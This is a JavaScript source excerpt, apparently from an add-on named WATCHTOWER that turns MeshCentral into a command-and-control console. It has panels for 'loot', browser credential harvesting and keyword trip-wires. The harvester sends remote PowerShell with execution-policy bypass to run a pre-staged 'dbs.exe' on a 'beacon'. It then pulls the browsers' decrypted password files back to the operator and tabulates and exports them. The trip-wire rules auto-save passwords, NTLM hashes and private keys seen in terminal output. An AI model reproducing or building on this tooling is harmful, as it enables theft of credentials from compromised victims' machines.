            beaconId:    nodeId ? getBeaconId(nodeId) : '????????',
            beaconName:  nd ? (nd.name || nd._id) : (nodeId || '—'),
            ip:          nd ? (nd.ip || '—') : '—'
        };
        wtLootStore.unshift(entry);
        if (wtLootStore.length > 500) wtLootStore = wtLootStore.slice(0, 500);
        saveLootStore();
        var btn = document.getElementById('wtLootBtn');
        if (btn) {
            btn.classList.add('wt-toolbar-btn-flash');
            setTimeout(function() { btn.classList.remove('wt-toolbar-btn-flash'); }, 700);
        }
        updateLootBadge();
        if (wtLootVisible) renderLootTable();
        wtLogEvent('LOOT', '[' + entry.tag + '] ' + content.substring(0, 70), nodeId);
    }

    function deleteLootEntry(id) {
        wtLootStore = wtLootStore.filter(function(e) { return e.id !== id; });
        saveLootStore();
        updateLootBadge();
        renderLootTable();
    }

    function updateLootBadge() {
        var badge = document.getElementById('wtLootBadge');
        if (badge) badge.textContent = wtLootStore.length ? wtLootStore.length : '';
    }

    function injectLootButton() {
        var span = getWtToolbar();
        if (!span || document.getElementById('wtLootBtn')) return;
        var btn = document.createElement('button');
        btn.id        = 'wtLootBtn';
        btn.className = 'wt-toolbar-btn';
        btn.title     = 'Loot Vault — highlight terminal text and right-click to save';
        btn.innerHTML = '&#9651; VAULT <span id="wtLootBadge" class="wt-loot-badge"></span>';
        btn.onclick   = toggleLootPanel;
        span.appendChild(btn);
    }

    function toggleLootPanel() {
        var panel = document.getElementById('wtLootPanel');
        if (!panel) {
            buildLootPanel();
            wtLootVisible = true;
            var btn = document.getElementById('wtLootBtn');
            if (btn) btn.classList.add('wt-toolbar-btn-active');
            return;
        }
        wtLootVisible = !wtLootVisible;
        panel.style.display = wtLootVisible ? 'flex' : 'none';
        var btn = document.getElementById('wtLootBtn');
        if (btn) btn.classList.toggle('wt-toolbar-btn-active', wtLootVisible);
        if (wtLootVisible) renderLootTable();
    }

    function buildLootPanel() {
        var existing = document.getElementById('wtLootPanel');
        if (existing) existing.remove();

        var panel = document.createElement('div');
        panel.id        = 'wtLootPanel';
        panel.className = 'wt-loot-panel';

        panel.innerHTML =
            '<div class="wt-loot-header">' +
                '<span class="wt-loot-title">&#9651; LOOT VAULT</span>' +
                '<div class="wt-loot-controls">' +
                    '<input type="text" id="wtLootSearch" class="wt-loot-search" placeholder="&#128269; search content / beacon…" />' +
                    '<select id="wtLootTagFilter" class="wt-loot-filter">' +
                        '<option value="ALL">ALL TAGS</option>' +
                        '<option value="CREDS">CREDS</option>' +
                        '<option value="HASHES">HASHES</option>' +
                        '<option value="KEYS">KEYS</option>' +
                        '<option value="RECON">RECON</option>' +
                        '<option value="FILES">FILES</option>' +
                        '<option value="OTHER">OTHER</option>' +
                    '</select>' +
                    '<button class="wt-loot-action-btn" id="wtLootExport">&#128203; EXPORT</button>' +
                    '<button class="wt-loot-action-btn wt-loot-clr" id="wtLootClr">CLR</button>' +
                    '<button class="wt-loot-close-btn" id="wtLootClose">&#10005;</button>' +
                '</div>' +
            '</div>' +
            '<div class="wt-loot-table-wrap">' +
                '<table class="wt-loot-table">' +
                    '<thead><tr>' +
                        '<th>TIME</th>' +
                        '<th>BEACON</th>' +
                        '<th>IP</th>' +
                        '<th>TAG</th>' +
                        '<th>CONTENT</th>' +
                        '<th></th>' +
                    '</tr></thead>' +
                    '<tbody id="wtLootBody"></tbody>' +
                '</table>' +
            '</div>';

        var toolbar = document.getElementById('devListToolbarSpan');
        if (toolbar && toolbar.parentNode) {
            toolbar.parentNode.insertBefore(panel, toolbar.nextSibling);
        } else {
            var p1 = document.getElementById('p1');
            if (p1) p1.appendChild(panel);
        }

        document.getElementById('wtLootSearch').addEventListener('input', function() {
            wtLootSearch = this.value.toLowerCase();
            renderLootTable();
        });
        document.getElementById('wtLootTagFilter').addEventListener('change', function() {
            wtLootFilterTag = this.value;
            renderLootTable();
        });
        document.getElementById('wtLootExport').addEventListener('click', exportLoot);
        document.getElementById('wtLootClr').addEventListener('click', function() {
            if (!confirm('Clear all loot vault entries? This cannot be undone.')) return;
            wtLootStore = [];
            saveLootStore();
            updateLootBadge();
            renderLootTable();
        });
        document.getElementById('wtLootClose').addEventListener('click', function() {
            wtLootVisible = false;
            panel.style.display = 'none';
            var btn = document.getElementById('wtLootBtn');
            if (btn) btn.classList.remove('wt-toolbar-btn-active');
        });
        wtPatchInputs(panel);
        renderLootTable();
    }

    function renderLootTable() {
        var tbody = document.getElementById('wtLootBody');
        if (!tbody) return;

        var filtered = wtLootStore.filter(function(e) {
            var tagOk  = wtLootFilterTag === 'ALL' || e.tag === wtLootFilterTag;
            var srchOk = !wtLootSearch ||
                (e.content    && e.content.toLowerCase().indexOf(wtLootSearch)    >= 0) ||
                (e.beaconName && e.beaconName.toLowerCase().indexOf(wtLootSearch) >= 0) ||
                (e.beaconId   && e.beaconId.toLowerCase().indexOf(wtLootSearch)   >= 0) ||
                (e.ip         && e.ip.toLowerCase().indexOf(wtLootSearch)         >= 0);
            return tagOk && srchOk;
        });

        if (filtered.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="wt-loot-empty">— vault empty —</td></tr>';
            return;
        }

        tbody.innerHTML = filtered.map(function(e) {
            var d  = new Date(e.ts);
            var ts = d.toLocaleTimeString('en-GB', { hour12: false }) + '<br><span class="wt-loot-date">' + d.toLocaleDateString('en-GB') + '</span>';
            var tagMeta = WT_LOOT_TAGS[e.tag] || WT_LOOT_TAGS.OTHER;
            var safe    = (e.content || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
            var isLong  = safe.length > 140;
            var preview = isLong ? safe.substring(0, 140) + '…' : safe;
            var eid     = 'le_' + e.id;
            var encContent = encodeURIComponent(e.content || '');

            return '<tr class="wt-loot-row">' +
                '<td class="wt-loot-ts">' + ts + '</td>' +
                '<td class="wt-loot-beacon"><span class="wt-beacon-id-badge">' + e.beaconId + '</span><br><span class="wt-loot-bname">' + (e.beaconName || '').substring(0,16) + '</span></td>' +
                '<td class="wt-loot-ip">' + (e.ip || '—') + '</td>' +
                '<td><span class="wt-loot-tag" style="border-color:' + tagMeta.color + ';color:' + tagMeta.color + '">' + e.tag + '</span></td>' +
                '<td class="wt-loot-content" id="' + eid + '" data-full="' + encContent + '" data-exp="0">' +
                    '<code class="wt-loot-code" id="' + eid + '_pre">' + preview + '</code>' +
                    (isLong ? '<button class="wt-loot-expand-btn" onclick="(function(b){' +
                        'var td=b.closest(\'td\');var pre=td.querySelector(\'.wt-loot-code\');' +
                        'var full=decodeURIComponent(td.dataset.full);' +
                        'if(td.dataset.exp===\'0\'){pre.innerHTML=full;b.textContent=\'▲\';td.dataset.exp=\'1\';}' +
                        'else{pre.innerHTML=full.substring(0,140)+\'…\';b.textContent=\'▼\';td.dataset.exp=\'0\';}' +
                    '})(this)">▼</button>' : '') +
                '</td>' +
                '<td class="wt-loot-acts">' +
                    '<button class="wt-loot-act-btn wt-loot-copy" title="Copy to clipboard" onclick="(function(){try{navigator.clipboard.writeText(decodeURIComponent(\'' + encContent + '\'));}catch(e){}})()">&#128203;</button>' +
                    '<button class="wt-loot-act-btn wt-loot-del" title="Delete" onclick="deleteLootEntry(\'' + e.id + '\')">&#10005;</button>' +
                '</td>' +
            '</tr>';
        }).join('');
    }

    function exportLoot() {
        var exportBtn = document.getElementById('wtLootExport');
        var toExport = wtLootFilterTag === 'ALL' ? wtLootStore : wtLootStore.filter(function(e) { return e.tag === wtLootFilterTag; });
        if (!toExport.length) return;

        var lines = [
            'WATCHTOWER LOOT VAULT — EXPORT',
            'Generated : ' + new Date().toISOString(),
            'Filter    : ' + wtLootFilterTag,
            'Entries   : ' + toExport.length,
            '═'.repeat(70)
        ];
        toExport.forEach(function(e, i) {
            var d = new Date(e.ts);
            lines.push('');
            lines.push('[' + (i + 1) + ']  ' + e.tag + '  |  ' + d.toLocaleString() + '  |  Beacon: ' + e.beaconId + ' / ' + e.beaconName + '  |  IP: ' + e.ip);
            lines.push('─'.repeat(70));
            lines.push(e.content);
        });
        lines.push('');
        lines.push('═'.repeat(70));

        var text = lines.join('\n');
        try {
            navigator.clipboard.writeText(text).then(function() {
                if (exportBtn) { var o = exportBtn.innerHTML; exportBtn.innerHTML = '&#10003; COPIED!'; setTimeout(function() { exportBtn.innerHTML = o; }, 1800); }
            });
        } catch(ex) {
            var w = window.open('', '_blank');
            if (w) { w.document.write('<pre style="background:#0a0e14;color:#c8d0d8;padding:20px;font-family:monospace;font-size:12px;white-space:pre-wrap">' + text.replace(/</g, '&lt;') + '</pre>'); }
        }
    }

    // Context menu — right-click on terminal selection
    function setupLootContextMenu() {
        document.addEventListener('contextmenu', function(e) {
            var termWrap = document.getElementById('termarea3xdiv') || document.getElementById('termarea3x');
            if (!termWrap || !termWrap.contains(e.target)) return;
            var sel = '';
            try {
                if (typeof xterm !== 'undefined' && xterm && typeof xterm.getSelection === 'function') {
                    sel = xterm.getSelection();
                }
            } catch(ex) {}
            if (!sel || !sel.trim()) sel = window.getSelection ? window.getSelection().toString() : '';
            if (!sel || !sel.trim()) return;
            e.preventDefault();
            e.stopPropagation();
            showLootCtxMenu(e.clientX, e.clientY, sel.trim());
        }, true);
    }

    function showLootCtxMenu(x, y, text) {
        var old = document.getElementById('wtLootCtxMenu');
        if (old) old.remove();
        wtLootCtxTarget = text;

        var menu = document.createElement('div');
        menu.id        = 'wtLootCtxMenu';
        menu.className = 'wt-loot-ctx';

        var preview = text.length > 80 ? text.substring(0, 80) + '…' : text;
        menu.innerHTML =
            '<div class="wt-loot-ctx-title">&#9651; SAVE TO VAULT</div>' +
            '<div class="wt-loot-ctx-preview">' + preview.replace(/</g,'&lt;') + '</div>' +
            Object.keys(WT_LOOT_TAGS).map(function(tag) {
                var col = WT_LOOT_TAGS[tag].color;
                return '<div class="wt-loot-ctx-item" data-tag="' + tag + '">' +
                    '<span class="wt-loot-ctx-dot" style="background:' + col + '"></span>' +
                    '<span class="wt-loot-ctx-label" style="color:' + col + '">' + tag + '</span>' +
                '</div>';
            }).join('') +
            '<div class="wt-loot-ctx-sep"></div>' +
            '<div class="wt-loot-ctx-cancel">CANCEL</div>';

        // Position within viewport
        var vw = window.innerWidth, vh = window.innerHeight;
        var menuW = 200, menuH = 280;
        var left = (x + menuW > vw) ? vw - menuW - 8 : x;
        var top  = (y + menuH > vh) ? vh - menuH - 8 : y;
        menu.style.left = left + 'px';
        menu.style.top  = top  + 'px';
        document.body.appendChild(menu);

        menu.querySelectorAll('.wt-loot-ctx-item').forEach(function(item) {
            item.addEventListener('click', function(ev) {
                ev.stopPropagation();
                addLootEntry(wtLootCtxTarget, item.dataset.tag, wtCurrentIntelNodeId);
                menu.remove();
            });
        });
        menu.querySelector('.wt-loot-ctx-cancel').addEventListener('click', function(ev) {
            ev.stopPropagation();
            menu.remove();
        });

        // Dismiss on outside click
        setTimeout(function() {
            function _dismiss(ev) {
                if (!menu.contains(ev.target)) { menu.remove(); document.removeEventListener('mousedown', _dismiss); }
            }
            document.addEventListener('mousedown', _dismiss);
        }, 50);
    }

    function setupLootVault() {
        loadLootStore();
        injectLootButton();
        updateLootBadge();
        setupLootContextMenu();
    }

    // ============================================================
    // SECTION 26: CREDENTIAL HARVESTER
    // ============================================================

    var wtCredsStore = [];

    function loadCredsStore() {
        try { wtCredsStore = JSON.parse(localStorage.getItem('wt_creds_v1') || '[]'); } catch(e) { wtCredsStore = []; }
    }

    function saveCredsStore() {
        try { localStorage.setItem('wt_creds_v1', JSON.stringify(wtCredsStore.slice(0, 1000))); } catch(e) {}
    }

    function setupCredParser() {
        loadCredsStore();
        injectCredsButton();
        // Expose functions needed by dynamically-rendered table row buttons
        window._wtTogglePass    = wtTogglePass;
        window._wtCopyCredField = wtCopyCredField;
        window._wtCredsToVault  = wtCredsToVault;
        window._wtDeleteCred    = wtDeleteCred;
    }

    function injectCredsButton() {
        var span = getWtToolbar();
        if (!span || document.getElementById('wtCredsBtn')) return;
        var btn = document.createElement('button');
        btn.id = 'wtCredsBtn';
        btn.className = 'wt-toolbar-btn';
        btn.innerHTML = '&#9632; CREDS <span id="wtCredsBadge" class="wt-badge" style="display:none">0</span>';
        btn.onclick = toggleCredsPanel;
        span.appendChild(btn);
        updateCredsBadge();
    }

    function updateCredsBadge() {
        var badge = document.getElementById('wtCredsBadge');
        if (!badge) return;
        badge.textContent = wtCredsStore.length;
        badge.style.display = wtCredsStore.length > 0 ? 'inline' : 'none';
    }

    function toggleCredsPanel() {
        var panel = document.getElementById('wtCredsPanel');
        if (!panel) { buildCredsPanel(); return; }
        var v = panel.style.display !== 'none';
        panel.style.display = v ? 'none' : 'block';
        var btn = document.getElementById('wtCredsBtn');
        if (btn) btn.classList.toggle('wt-btn-active', !v);
    }

    function buildCredsPanel() {
        var panel = document.createElement('div');
        panel.id = 'wtCredsPanel';
        panel.className = 'wt-slide-panel';
        panel.innerHTML =
            '<div class="wt-panel-header">' +
                '<span class="wt-panel-title">&#9632; CREDENTIAL HARVESTER</span>' +
                '<div class="wt-panel-controls">' +
                    '<span id="wtHarvestStatus" class="wt-harvest-status"></span>' +
                    '<button id="wtHarvestBtn" class="wt-toolbar-btn wt-harvest-btn">&#9654; HARVEST</button>' +
                    '<button class="wt-toolbar-btn wt-creds-export-btn">EXPORT</button>' +
                    '<button class="wt-toolbar-btn wt-creds-clr-btn">CLR</button>' +
                    '<button class="wt-toolbar-btn wt-creds-close-btn">&#10005;</button>' +
                '</div>' +
            '</div>' +
            '<div class="wt-panel-filters">' +
                '<input id="wtCredsSearch" type="text" placeholder="Search URL / username / IP..." class="wt-search-input">' +
                '<select id="wtCredsFilter" class="wt-filter-select">' +
                    '<option value="">ALL BROWSERS</option>' +
                    '<option value="Chrome">CHROME</option>' +
                    '<option value="Edge">EDGE</option>' +
                    '<option value="Brave">BRAVE</option>' +
                    '<option value="Firefox">FIREFOX</option>' +
                    '<option value="Opera">OPERA</option>' +
                '</select>' +
            '</div>' +
            '<div class="wt-creds-table-wrap">' +
                '<table class="wt-creds-table">' +
                    '<thead><tr>' +
                        '<th>BROWSER</th><th>URL</th><th>USERNAME</th>' +
                        '<th>PASSWORD</th><th>BEACON</th><th>ACTIONS</th>' +
                    '</tr></thead>' +
                    '<tbody id="wtCredsTbody"></tbody>' +
                '</table>' +
            '</div>';

        // Wire panel-level buttons via addEventListener (inside IIFE scope)
        panel.querySelector('#wtHarvestBtn').addEventListener('click', wtHarvest);
        panel.querySelector('.wt-creds-export-btn').addEventListener('click', wtExportCreds);
        panel.querySelector('.wt-creds-clr-btn').addEventListener('click', wtClearCreds);
        panel.querySelector('.wt-creds-close-btn').addEventListener('click', toggleCredsPanel);
        panel.querySelector('#wtCredsSearch').addEventListener('input', wtRenderCredsTable);
        panel.querySelector('#wtCredsFilter').addEventListener('change', wtRenderCredsTable);

        var tb = document.getElementById('devListToolbarSpan');
        if (tb && tb.parentNode) tb.parentNode.insertBefore(panel, tb.nextSibling);

        var btn = document.getElementById('wtCredsBtn');
        if (btn) btn.classList.add('wt-btn-active');
        wtPatchInputs(panel);
        wtRenderCredsTable();
    }

    function wtSetHarvestStatus(msg, type) {
        var el = document.getElementById('wtHarvestStatus');
        if (el) { el.textContent = msg; el.className = 'wt-harvest-status wt-status-' + (type || 'info'); }
    }

    function wtHarvest() {
        if (!wtCurrentIntelNodeId) { wtSetHarvestStatus('Select a beacon first', 'error'); return; }
        var node = null;
        for (var i = 0; i < nodes.length; i++) {
            if (nodes[i]._id === wtCurrentIntelNodeId) { node = nodes[i]; break; }
        }
        if (!node) { wtSetHarvestStatus('Beacon not in node list', 'error'); return; }

        var hBtn = document.getElementById('wtHarvestBtn');
        if (hBtn) hBtn.disabled = true;

        wtSetHarvestStatus('Executing DBS on target...', 'running');
        wtLogEvent('CMD', 'HARVEST started on ' + (node.name || 'beacon'), wtCurrentIntelNodeId);

        // t=0s: Run DBS (assumes dbs.exe + DLL already staged in %TEMP%)
        sendBeaconCmd('powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:all /e:all /spoof"');

        // t=2s: Echo TEMP path with extraction marker
        setTimeout(function() {
            wtSetHarvestStatus('Getting target TEMP path...', 'running');
            sendBeaconCmd('powershell -ep bypass -c "Write-Host \'WTTEMP:\'+$env:TEMP"');
        }, 2000);

        // t=5s: Read TEMP path from xterm buffer
        setTimeout(function() {
            wtSetHarvestStatus('Waiting for DBS to complete... (~12s total)', 'running');
            window._wtHarvestNode     = node;
            window._wtHarvestTempPath = wtExtractTempPath();
        }, 5000);

        // t=12s: Fetch JSON output files from agent
        setTimeout(function() {
            wtSetHarvestStatus('Fetching credential files...', 'running');
            var n   = window._wtHarvestNode;
            var mid = (n.meshid || '').split('/').pop();
            var nid = (n._id   || '').split('/').pop();
            wtFetchCredFiles(mid, nid, n, window._wtHarvestTempPath, function(total) {
                if (hBtn) hBtn.disabled = false;
                if (total > 0) {
                    wtSetHarvestStatus(total + ' credentials harvested', 'success');
                    wtLogEvent('LOOT', 'HARVEST: ' + total + ' creds from ' + (n.name || 'beacon'), wtCurrentIntelNodeId);
                    var cb = document.getElementById('wtCredsBtn');
                    if (cb) { cb.style.color = '#00ff41'; setTimeout(function() { cb.style.color = ''; }, 2000); }
                } else {
                    wtSetHarvestStatus('No creds found — stage DBS first (Payload Studio → DBS tab)', 'warn');
                }
            });
        }, 12000);
    }

    function wtExtractTempPath() {
        try {
            if (typeof xterm === 'undefined' || !xterm.buffer || !xterm.buffer.active) return null;
            var buf = xterm.buffer.active;
            for (var i = buf.length - 1; i > Math.max(0, buf.length - 100); i--) {
                var line = buf.getLine(i);
                if (!line) continue;
                var txt = line.translateToString(true).trim();
                if (txt.indexOf('WTTEMP:') >= 0) return txt.replace(/.*WTTEMP:/, '').trim();
            }
        } catch(e) {}
        return null;
    }

    function wtFetchCredFiles(mid, nid, node, tempPath, cb) {
        var files = [
            { name: 'ChromeData.json',  browser: 'Chrome'  },
            { name: 'EdgeData.json',    browser: 'Edge'    },
            { name: 'BraveData.json',   browser: 'Brave'   },
            { name: 'FirefoxData.json', browser: 'Firefox' },
            { name: 'OperaData.json',   browser: 'Opera'   }
        ];
        var total = 0, done = 0;
        files.forEach(function(f) {
            wtFetchOneCredFile(mid, nid, tempPath, f.name, f.browser, node, function(count) {
                total += count;
                done++;
                if (done === files.length) {
                    if (total > 0) { saveCredsStore(); updateCredsBadge(); wtRenderCredsTable(); }
                    cb(total);
                }
            });
        });
    }

    function wtFetchOneCredFile(mid, nid, tempPath, filename, browser, node, cb) {
        var paths = [];
        if (tempPath) paths.push(tempPath + '\\' + filename);
        paths.push('C:\\Windows\\Temp\\' + filename);

        function tryPath(idx) {
            if (idx >= paths.length) { cb(0); return; }
            var url = 'devicefile.ashx?c=' + encodeURIComponent(authCookie) +
                      '&m=' + encodeURIComponent(mid) +
                      '&n=' + encodeURIComponent(nid) +
                      '&f=' + encodeURIComponent(paths[idx]);
            fetch(url)
                .then(function(r) { return r.ok ? r.text() : null; })
                .then(function(text) {
                    if (!text || text.trim().charAt(0) !== '[') { tryPath(idx + 1); return; }
                    cb(wtParseCredJSON(text, browser, node));
                })
                .catch(function() { tryPath(idx + 1); });
        }
        tryPath(0);
    }

    function wtParseCredJSON(text, browser, node) {
        var data;
        try { data = JSON.parse(text); } catch(e) { return 0; }
        if (!Array.isArray(data)) return 0;
        var count = 0;
        var nid = node._id || '';
        var beaconId = nid.split('/').pop().substring(0, 8).toUpperCase();
        data.forEach(function(e) {
            var url  = e.url || e.origin_url || e.action_url || e.hostname || e.host || '';
            var user = e.username || e.username_value || e.user || e.login || '';
            var pass = e.password || e.password_value || e.decrypted_password || e.decryptedPassword || '';
            if (!url && !user && !pass) return;
            var dup = wtCredsStore.some(function(c) {
                return c.browser === browser && c.url === url && c.username === user && c.password === pass;
            });
            if (dup) return;
            wtCredsStore.unshift({
                id: Date.now() + '_' + count + '_' + Math.random().toString(36).slice(2),
                ts: Date.now(), browser: browser,
                url: url, username: user, password: pass,
                nodeId: nid, beaconId: beaconId,
                beaconName: node.name || '', ip: node.ip || ''
            });
            count++;
        });
        return count;
    }

    function wtRenderCredsTable() {
        var tbody = document.getElementById('wtCredsTbody');
        if (!tbody) return;
        var search  = (document.getElementById('wtCredsSearch') || {}).value || '';
        var bFilter = (document.getElementById('wtCredsFilter') || {}).value || '';
        var list = wtCredsStore.filter(function(c) {
            if (bFilter && c.browser !== bFilter) return false;
            if (search) {
                var q = search.toLowerCase();
                return (c.url||'').toLowerCase().indexOf(q) >= 0 ||
                       (c.username||'').toLowerCase().indexOf(q) >= 0 ||
                       (c.ip||'').indexOf(q) >= 0 ||
                       (c.beaconName||'').toLowerCase().indexOf(q) >= 0;
            }
            return true;
        });
        if (list.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="wt-empty-msg">' +
                (wtCredsStore.length === 0
                    ? 'No credentials — select a beacon then click HARVEST'
                    : 'No results match filter') +
                '</td></tr>';
            return;
        }
        tbody.innerHTML = list.map(function(c) {
            var bc = 'wt-browser-' + (c.browser || 'other').toLowerCase();
            var id = wtEsc(c.id);
            return '<tr>' +
                '<td><span class="wt-browser-badge ' + bc + '">' + wtEsc(c.browser||'?') + '</span></td>' +
                '<td class="wt-url-cell" title="' + wtEsc(c.url||'') + '">' + wtEsc(wtTrunc(c.url||'—', 45)) + '</td>' +
                '<td>' + wtEsc(c.username||'—') + '</td>' +
                '<td class="wt-pass-cell">' +
                    '<span class="wt-pass-hidden">&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;</span>' +
                    '<span class="wt-pass-text" style="display:none">' + wtEsc(c.password||'') + '</span>' +
                    ' <button class="wt-mini-btn" onclick="_wtTogglePass(this)">SHOW</button>' +
                '</td>' +
                '<td><span class="wt-beacon-id-badge">' + wtEsc(c.beaconId||'?') + '</span></td>' +
                '<td class="wt-action-cell">' +
                    '<button class="wt-mini-btn" onclick="_wtCopyCredField(\'' + id + '\',\'up\')">U:P</button>' +
                    '<button class="wt-mini-btn" onclick="_wtCopyCredField(\'' + id + '\',\'pass\')">PASS</button>' +
                    '<button class="wt-mini-btn wt-vault-btn" onclick="_wtCredsToVault(\'' + id + '\')">VAULT</button>' +
                    '<button class="wt-mini-btn wt-danger-mini" onclick="_wtDeleteCred(\'' + id + '\')">&#10005;</button>' +
                '</td>' +
            '</tr>';
        }).join('');
    }

    function wtTogglePass(btn) {
        var cell = btn.parentNode;
        var h = cell.querySelector('.wt-pass-hidden');
        var t = cell.querySelector('.wt-pass-text');
        if (!h || !t) return;
        var showing = t.style.display !== 'none';
        h.style.display = showing ? '' : 'none';
        t.style.display = showing ? 'none' : '';
        btn.textContent = showing ? 'SHOW' : 'HIDE';
    }

    function wtCopyCredField(id, field) {
        var c = wtCredsStore.find(function(x) { return x.id === id; });
        if (!c) return;
        var val = field === 'up' ? (c.username||'') + ':' + (c.password||'') : (c.password||'');
        navigator.clipboard.writeText(val).catch(function() {});
    }

    function wtCredsToVault(id) {
        var c = wtCredsStore.find(function(x) { return x.id === id; });
        if (!c) return;
        addLootEntry('[' + (c.browser||'?') + '] ' + (c.url||'') + ' | ' + (c.username||'') + ':' + (c.password||''), 'CREDS', c.nodeId);
    }

    function wtDeleteCred(id) {
        wtCredsStore = wtCredsStore.filter(function(x) { return x.id !== id; });
        saveCredsStore(); updateCredsBadge(); wtRenderCredsTable();
    }

    function wtClearCreds() {
        if (!confirm('Clear all ' + wtCredsStore.length + ' credentials?')) return;
        wtCredsStore = []; saveCredsStore(); updateCredsBadge(); wtRenderCredsTable();
    }

    function wtExportCreds() {
        var bFilter = (document.getElementById('wtCredsFilter')||{}).value || '';
        var search  = (document.getElementById('wtCredsSearch')||{}).value  || '';
        var list = wtCredsStore.filter(function(c) {
            if (bFilter && c.browser !== bFilter) return false;
            if (search) { var q = search.toLowerCase(); return (c.url||'').toLowerCase().indexOf(q) >= 0 || (c.username||'').toLowerCase().indexOf(q) >= 0; }
            return true;
        });
        var out = ['=== WATCHTOWER CREDENTIAL DUMP ===', new Date().toISOString(), 'Count: ' + list.length, ''];
        list.forEach(function(c) {
            out.push('[' + (c.browser||'?') + '] ' + (c.beaconId||'') + ' @ ' + (c.ip||''));
            out.push('URL:  ' + (c.url||'—'));
            out.push('USER: ' + (c.username||'—'));
            out.push('PASS: ' + (c.password||'—'));
            out.push('---');
        });
        var txt = out.join('\n');
        navigator.clipboard.writeText(txt).catch(function() {
            var w = window.open('', '_blank');
            if (w) w.document.write('<pre style="background:#000;color:#0f0;padding:20px">' + txt.replace(/</g,'&lt;') + '</pre>');
        });
    }

    function wtEsc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
    function wtTrunc(s, n) { return s.length > n ? s.slice(0, n) + '\u2026' : s; }

    // Prevent MeshCentral's global keydown/keypress handlers from swallowing
    // keystrokes when the user types inside any WATCHTOWER panel input.
    // Call this once per panel after it is inserted into the DOM.
    function wtPatchInputs(container) {
        container.querySelectorAll('input, textarea, select').forEach(function(el) {
            el.addEventListener('keydown',  function(e) { e.stopPropagation(); });
            el.addEventListener('keypress', function(e) { e.stopPropagation(); });
            el.addEventListener('keyup',    function(e) { e.stopPropagation(); });
        });
    }

    // ============================================================
    // Section 29: Trip-Wire / Keyword Alert Monitor
    // ============================================================

    var WT_TW_KEY        = 'wt_tripwire_v1';
    var WT_TW_ALERT_KEY  = 'wt_alerts_v1';
    var wtTripWireRules   = [];
    var wtTripWireAlerts  = [];
    var wtTripWireLastLine = 0;
    var wtTripWireInterval = null;
    var wtTripWireVisible  = false;

    var WT_TW_DEFAULT_RULES = [
        { id:'tw_01', pattern:'password',                           flag:'i',  tag:'CREDS',  autoLoot:true,  enabled:true, builtin:true },
        { id:'tw_02', pattern:'passwd',                             flag:'i',  tag:'CREDS',  autoLoot:true,  enabled:true, builtin:true },
        { id:'tw_03', pattern:'credential',                         flag:'i',  tag:'CREDS',  autoLoot:true,  enabled:true, builtin:true },
        { id:'tw_04', pattern:'[0-9a-fA-F]{32}::[0-9a-fA-F]{32}', flag:'',   tag:'HASHES', autoLoot:true,  enabled:true, builtin:true },
        { id:'tw_05', pattern:'NTLM|NTHash|LM hash',               flag:'i',  tag:'HASHES', autoLoot:true,  enabled:true, builtin:true },
        { id:'tw_06', pattern:'SeDebugPrivilege',                   flag:'',   tag:'PRIV',   autoLoot:false, enabled:true, builtin:true },
        { id:'tw_07', pattern:'NT AUTHORITY.SYSTEM',                flag:'i',  tag:'PRIV',   autoLoot:false, enabled:true, builtin:true },
        { id:'tw_08', pattern:'BEGIN .{0,10}PRIVATE KEY',           flag:'i',  tag:'KEYS',   autoLoot:true,  enabled:true, builtin:true },
        { id:'tw_09', pattern:'ssh-rsa|ssh-ed25519|ecdsa-sha2',    flag:'i',  tag:'KEYS',   autoLoot:true,  enabled:true, builtin:true },
        { id:'tw_10', pattern:'flag\\{',                            flag:'i',  tag:'LOOT',   autoLoot:true,  enabled:true, builtin:true }
    ];

    var WT_TW_TAG_COLORS = {
        'CREDS':'#ff3333', 'HASHES':'#ff8c00', 'KEYS':'#ffd700',
        'PRIV':'#a855f7',  'LOOT':'#00ff41',   'CUSTOM':'#7a8a9a'
    };

    function setupTripWire() {
        loadTripWireRules();
        loadTripWireAlerts();
        injectTripWireButton();
        startTripWireWatcher();
    }

    function loadTripWireRules() {
        try {
            var saved = JSON.parse(localStorage.getItem(WT_TW_KEY) || 'null');
            wtTripWireRules = (saved && Array.isArray(saved)) ? saved
                : WT_TW_DEFAULT_RULES.map(function(r){ return Object.assign({},r); });
        } catch(e) {
            wtTripWireRules = WT_TW_DEFAULT_RULES.map(function(r){ return Object.assign({},r); });
        }
        saveTripWireRules();
    }

    function saveTripWireRules() {
        try { localStorage.setItem(WT_TW_KEY, JSON.stringify(wtTripWireRules)); } catch(e) {}
    }

    function loadTripWireAlerts() {
        try { wtTripWireAlerts = JSON.parse(localStorage.getItem(WT_TW_ALERT_KEY) || '[]'); }
        catch(e) { wtTripWireAlerts = []; }
    }

    function saveTripWireAlerts() {
        try { localStorage.setItem(WT_TW_ALERT_KEY, JSON.stringify(wtTripWireAlerts.slice(0,100))); } catch(e) {}
    }

    function injectTripWireButton() {
        var poll = setInterval(function() {
            var span = getWtToolbar();
            if (!span || document.getElementById('wtTripWireBtn')) return;
            clearInterval(poll);
            var btn = document.createElement('button');
            btn.id = 'wtTripWireBtn';
            btn.className = 'wt-toolbar-btn';
            btn.innerHTML = '&#9889; WIRE <span id="wtTwBadge" class="wt-tw-badge" style="display:none">0</span>';
            btn.title = 'Trip-Wire — monitors terminal output for keywords';
            btn.addEventListener('click', toggleTripWirePanel);
            span.appendChild(btn);
            updateTripWireBadge();
        }, 500);
    }

    function updateTripWireBadge() {
        var b = document.getElementById('wtTwBadge');
        if (!b) return;
        var n = wtTripWireAlerts.length;
        b.textContent = n > 99 ? '99+' : n;
        b.style.display = n > 0 ? 'inline-block' : 'none';
    }

    function toggleTripWirePanel() {
        var btn = document.getElementById('wtTripWireBtn');
        var existing = document.getElementById('wtTripWirePanel');
        if (existing) {
            existing.remove();
            if (btn) btn.classList.remove('wt-toolbar-btn-active');
            wtTripWireVisible = false;
            return;
        }
        wtTripWireVisible = true;
        if (btn) btn.classList.add('wt-toolbar-btn-active');
        buildTripWirePanel();
    }

    function buildTripWirePanel() {
        var anchor = document.getElementById('devListToolbarSpan');
        if (!anchor) return;
        var panel = document.createElement('div');
        panel.id = 'wtTripWirePanel';
        panel.className = 'wt-tw-panel';
        panel.innerHTML =
            '<div class="wt-tw-header">' +
                '<span class="wt-tw-title">&#9889; TRIP-WIRE MONITOR</span>' +
